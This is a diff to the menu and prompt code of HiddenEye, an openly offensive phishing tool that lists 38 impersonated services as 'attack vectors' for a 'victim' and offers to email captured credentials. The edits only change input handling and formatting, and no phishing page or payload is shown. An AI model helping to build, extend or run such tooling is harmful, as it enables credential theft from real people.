@@ -1,6 +1,6 @@
 # Any actions must be here
 
-import getpass
+import getpass,getch
 import base64
 from os import system, path
 from distutils.dir_util import copy_tree
@@ -428,10 +428,11 @@ def runMainMenu():  # menu where user select what they wanna use
         stdout.flush()
 
     # Terms Of Service
-    if input("\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational purposes only? ({0}Y{1}/{2}N{1})\n{2}HiddenEye >>> {0}".format(MAIN2, MAIN4, MAIN0)).upper() != 'Y':
+    print("\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational purposes only? ({0}Y{1}/{2}N{1})\n{2}HiddenEye >>> {0}".format(MAIN2, MAIN4, MAIN0),end='')
+    choice=getch.getch().upper()
+    if choice not in 'Y\n':
         system('clear')
-        print("\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.!{1} ]\n\n".format(
-            MAIN0, MAIN4))
+        print("\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL. YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSES!{1} ]\n\n".format(MAIN0, MAIN4))
         exit()
 
 
@@ -449,183 +450,183 @@ def mainMenu():
 {3}[{2} PHISHING-KEYLOGGER-INFORMATION COLLECTOR-ALL_IN_ONE_TOOL-SOCIALENGINEERING {3}]
 ________________________________________________________________________________'''.format(MAIN3, MAIN4, MAIN2, MAIN0))
     print("------------------------\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n------------------------".format(MAIN0, MAIN2))
-    print(" {0}[{1}1{0}]{1} Facebook        {0}[{1}13{0}]{1} Steam          {0}[{1}25{0}]{1} Badoo           {0}[{1}37{0}]{1} PlayStation".format(MAIN0, MAIN2))
-    print(" {0}[{1}2{0}]{1} Google          {0}[{1}14{0}]{1} VK             {0}[{1}26{0}]{1} CryptoCurrency  {0}[{1}38{0}]{1} Xbox".format(
+    print(" {0}[{1}01{0}]{1} Facebook        {0}[{1}13{0}]{1} Steam          {0}[{1}25{0}]{1} Badoo           {0}[{1}37{0}]{1} PlayStation".format(MAIN0, MAIN2))
+    print(" {0}[{1}02{0}]{1} Google          {0}[{1}14{0}]{1} VK             {0}[{1}26{0}]{1} CryptoCurrency  {0}[{1}38{0}]{1} Xbox".format(MAIN0, MAIN2))
+    print(" {0}[{1}03{0}]{1} LinkedIn        {0}[{1}15{0}]{1} iCloud         {0}[{1}27{0}]{1} DevianArt ".format(
         MAIN0, MAIN2))
-    print(" {0}[{1}3{0}]{1} LinkedIn        {0}[{1}15{0}]{1} iCloud         {0}[{1}27{0}]{1} DevianArt ".format(
+    print(" {0}[{1}04{0}]{1} GitHub          {0}[{1}16{0}]{1} GitLab         {0}[{1}28{0}]{1} DropBox  ".format(
         MAIN0, MAIN2))
-    print(" {0}[{1}4{0}]{1} GitHub          {0}[{1}16{0}]{1} GitLab         {0}[{1}28{0}]{1} DropBox  ".format(
+    print(" {0}[{1}05{0}]{1} StackOverflow   {0}[{1}17{0}]{1} Netflix        {0}[{1}29{0}]{1} eBay  ".format(
         MAIN0, MAIN2))
-    print(" {0}[{1}5{0}]{1} StackOverflow   {0}[{1}17{0}]{1} Netflix        {0}[{1}29{0}]{1} eBay  ".format(
+    print(" {0}[{1}06{0}]{1} WordPress       {0}[{1}18{0}]{1} Origin         {0}[{1}30{0}]{1} MySpace ".format(
         MAIN0, MAIN2))
-    print(" {0}[{1}6{0}]{1} WordPress       {0}[{1}18{0}]{1} Origin         {0}[{1}30{0}]{1} MySpace ".format(
+    print(" {0}[{1}07{0}]{1} Twitter         {0}[{1}19{0}]{1} Pinterest      {0}[{1}31{0}]{1} PayPal ".format(
         MAIN0, MAIN2))
-    print(" {0}[{1}7{0}]{1} Twitter         {0}[{1}19{0}]{1} Pinterest      {0}[{1}31{0}]{1} PayPal ".format(
+    print(" {0}[{1}08{0}]{1} Instagram       {0}[{1}20{0}]{1} ProtonMail     {0}[{1}32{0}]{1} Shopify".format(
         MAIN0, MAIN2))
-    print(" {0}[{1}8{0}]{1} Instagram       {0}[{1}20{0}]{1} ProtonMail     {0}[{1}32{0}]{1} Shopify".format(
-        MAIN0, MAIN2))
-    print(" {0}[{1}9{0}]{1} Snapchat        {0}[{1}21{0}]{1} Spotify        {0}[{1}33{0}]{1} Verizon ".format(
+    print(" {0}[{1}09{0}]{1} Snapchat        {0}[{1}21{0}]{1} Spotify        {0}[{1}33{0}]{1} Verizon ".format(
         MAIN0, MAIN2))
     print(" {0}[{1}10{0}]{1} Yahoo          {0}[{1}22{0}]{1} Quora          {0}[{1}34{0}]{1} Yandex ".format(
         MAIN0, MAIN2))
     print(" {0}[{1}11{0}]{1} Twitch         {0}[{1}23{0}]{1} PornHub        {0}[{1}35{0}]{1} Reddit ".format(
         MAIN0, MAIN2))
-    print(" {0}[{1}12{0}]{1} Microsoft      {0}[{1}24{0}]{1} Adobe          {0}[{1}36{0}]{1} Subito.it ".format(
-        MAIN0, MAIN2))
+    print(" {0}[{1}12{0}]{1} Microsoft      {0}[{1}24{0}]{1} Adobe          {0}[{1}36{0}]{1} Subito.it ".format(MAIN0, MAIN2))
 
-    option = input("{0}HiddenEye >>>  {1}".format(MAIN0, MAIN2))
-    if option == '1':
+    print("{0}HiddenEye >>>  {1}".format(MAIN0, MAIN2))
+    try:option=(int)(getch.getch()+getch.getch());
+    except:mainMenu()
+    if option == 1:
         loadModule('Facebook')
         customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
         runPhishing('Facebook', customOption)
-    elif option == '2':
+    elif option == 2:
         loadModule('Google')
         customOption = input(
             "\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n {0}[{1}3{0}]{1} New Google Web\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
         runPhishing('Google', customOption)
-    elif option == '3':
+    elif option == 3:
         loadModule('LinkedIn')
         customOption = ''
         runPhishing('LinkedIn', customOption)
-    elif option == '4':
+    elif option == 4:
         loadModule('GitHub')
         customOption = ''
         runPhishing('GitHub', customOption)
-    elif option == '5':
+    elif option == 5:
         loadModule('StackOverflow')
         customOption = ''
         runPhishing('StackOverflow', customOption)
-    elif option == '6':
+    elif option == 6:
         loadModule('WordPress')
         customOption = ''
         runPhishing('WordPress', customOption)
-    elif option == '7':
+    elif option == 7:
         loadModule('Twitter')
         customOption = ''
         runPhishing('Twitter', customOption)
-    elif option == '8':
+    elif option == 8:
         loadModule('Instagram')
         customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (To Lure The Users)\n {0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)\n {0}[{1}4{0}]{1} Instagram Verified Badge Attack (Lure To Get Blue Badge){1} *[NEW]*\n {0}[{1}5{0}]{1} Instafollower (Lure To Get More Followers){1} *[NEW]*\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
         runPhishing('Instagram', customOption)
-    elif option == '9':
+    elif option == 9:
         loadModule('Snapchat')
         customOption = ''
         runPhishing('Snapchat', customOption)
-    elif option == '10':
+    elif option == 10:
         loadModule('Yahoo')
         customOption = ''
         runPhishing('Yahoo', customOption)
-    elif option == '11':
+    elif option == 11:
         loadModule('Twitch')
         customOption = ''
         runPhishing('Twitch', customOption)
-    elif option == '12':
+    elif option == 12:
         loadModule('Microsoft')
         customOption = ''
         runPhishing('Microsoft', customOption)
-    elif option == '13':
+    elif option == 13:
         loadModule('Steam')
         customOption = ''
         runPhishing('Steam', customOption)
-    elif option == '14':
+    elif option == 14:
         loadModule('VK')
         customOption = input(
             "\nOperation mode:\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
         runPhishing('VK', customOption)
-    elif option == '15':
+    elif option == 15:
         loadModule('iCloud')
         customOption = ''
         runPhishing('iCloud', customOption)
-    elif option == '16':
+    elif option == 16:
         loadModule('GitLab')
         customOption = ''
         runPhishing('GitLab', customOption)
-    elif option == '17':
+    elif option == 17:
         loadModule('NetFlix')
         customOption = ''
         runPhishing('NetFlix', customOption)
-    elif option == '18':
+    elif option == 18:
         loadModule('Origin')
         customOption = ''
         runPhishing('Origin', customOption)
-    elif option == '19':
+    elif option == 19:
         loadModule('Pinterest')
         customOption = ''
         runPhishing('Pinterest', customOption)
-    elif option == '20':
+    elif option == 20:
         loadModule('ProtonMail')
         customOption = ''
         runPhishing('ProtonMail', customOption)
-    elif option == '21':
+    elif option == 21:
         loadModule('Spotify')
         customOption = ''
         runPhishing('Spotify', customOption)
-    elif option == '22':
+    elif option == 22:
         loadModule('Quora')
         customOption = ''
         runPhishing('Quora', customOption)
-    elif option == '23':
+    elif option == 23:
         loadModule('PornHub')
         customOption = ''
         runPhishing('PornHub', customOption)
-    elif option == '24':
+    elif option == 24:
         loadModule('Adobe')
         customOption = ''
         runPhishing('Adobe', customOption)
-    elif option == '25':
+    elif option == 25:
         loadModule('Badoo')
         customOption = ''
         runPhishing('Badoo', customOption)
-    elif option == '26':
+    elif option == 26:
         loadModule('CryptoCurrency')
         customOption = ''
         runPhishing('CryptoCurrency', customOption)
-    elif option == '27':
+    elif option == 27:
         loadModule('DevianArt')
         customOption = ''
         runPhishing('DevianArt', customOption)
-    elif option == '28':
+    elif option == 28:
         loadModule('DropBox')
         customOption = ''
         runPhishing('DropBox', customOption)
-    elif option == '29':
+    elif option == 29:
         loadModule('eBay')
         customOption = ''
         runPhishing('eBay', customOption)
-    elif option == '30':
+    elif option == 30:
         loadModule('MySpace')
         customOption = ''
         runPhishing('Myspace', customOption)
-    elif option == '31':
+    elif option == 31:
         loadModule('PayPal')
         customOption = ''
         runPhishing('PayPal', customOption)
-    elif option == '32':
+    elif option == 32:
         loadModule('Shopify')
         customOption = ''
         runPhishing('Shopify', customOption)
-    elif option == '33':
+    elif option == 33:
         loadModule('Verizon')
         customOption = ''
         runPhishing('Verizon', customOption)
-    elif option == '34':
+    elif option == 34:
         loadModule('Yandex')
         customOption = ''
         runPhishing('Yandex', customOption)
-    elif option == '35':
+    elif option == 35:
         loadModule('Reddit')
         customOption = input(
             "\nOperation mode:\n {0}[{1}1{0}]{1} New reddit page\n {0}[{1}2{0}]{1} Old reddit page\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
         runPhishing('Reddit', customOption)
-    elif option == '36':
+    elif option == 36:
         loadModule('Subitoit')
         customOption = ''
         runPhishing('Subitoit', customOption)
-    elif option == '37':
+    elif option == 37:
         loadModule('PlayStation')
         customOption = ''
         runPhishing('PlayStation', customOption)
-    elif option == '38':
+    elif option == 38:
         loadModule('Xbox')
         customOption = ''
         runPhishing('Xbox', customOption)
@@ -850,38 +851,32 @@ def runServer(port):
 
 
 def emailPrompt3():  # Ask user to start sending credentials to recipient Email Address.
-    choice = input(
-        "\n\n{0}[{1}?{0}] Send Captured Data To Recipient Email Address.\nSend_Email(y/n)>> {2}".format(MAIN0, MAIN4, MAIN2)).upper()
-    if choice == 'Y':
-        if path.isfile('Defs/Send_Email/emailconfig.py') == True:
-            system('python3 Defs/Send_Email/SendEmail.py')
+    print("\n\n{0}[{1}?{0}] Send Captured Data To Recipient Email Address.\nSend Email[Y/n]> {2}".format(MAIN0, MAIN4, MAIN2))
+    choice=getch.getch().lower()
+    if choice in 'y\n':
+        if path.isfile('Defs/Send_Email/emailconfig.py'):system('python3 Defs/Send_Email/SendEmail.py')
         else:
-            print(
-                '[ERROR!]: NO CONFIG FILE FOUND ! PLEASE CREATE CONFIG FILE FIRST TO USE THIS OPTION.')
-            sleep(2)
+            system('clear')
+            print('[ERROR!]: NO CONFIG FILE FOUND ! PLEASE CREATE CONFIG FILE FIRST TO USE THIS OPTION.')
+            sleep(1)
             endMessage()
-    elif choice == 'N':
+    elif choice == 'n':
         endMessage()
     else:
         system('clear')
-        print("\n\n{0}[{1}^{0}] {2}Please Select A Valid Option.. ".format(
-            MAIN0, MAIN4, MAIN2))
+        print("\n\n{0}[{1}^{0}] {2}Please Select A Valid Option.. ".format(MAIN0, MAIN4, MAIN2))
         sleep(1)
-        system('clear')
         return emailPrompt3()
 
 
 def endMessage():  # Message when HiddenEye exit
-    choice = input(
-        "\n\n{0}[{1}?{0}] Re-run(r) : Exit(x) : Send Email(M)\n\n >> {2}".format(MAIN0, MAIN4, MAIN2)).upper()
-    if choice == 'R':
-        system('sudo python3 HiddenEye.py')
-    elif choice == 'M':
-        emailPrompt3()
-    elif choice == 'X':
+    print("\n{0}[{1}?{0}] [{2}r{1}erun{0}|{1}e{2}x{1}it{0}|{1}e{2}m{1}ail{0}] > {2}".format(MAIN0, MAIN4, MAIN2), end='')
+    choice=getch.getch().lower()
+    if choice =='r':system('sudo python3 '+argv[0])
+    elif choice =='m':emailPrompt3()
+    elif choice in'x\n':
         system('clear')
-        print('''
-                  {3}HIDDEN EYE {3}BY: DARKSEC TEAM
+        print('''                  {3}HIDDEN EYE {3}BY: DARKSEC TEAM
             {1}https://github.com/DarkSecDevelopers/HiddenEye
 
   {3}  [[*]] IF YOU LIKE THIS TOOL, THEN PLEASE HELP TO BECOME BETTER.
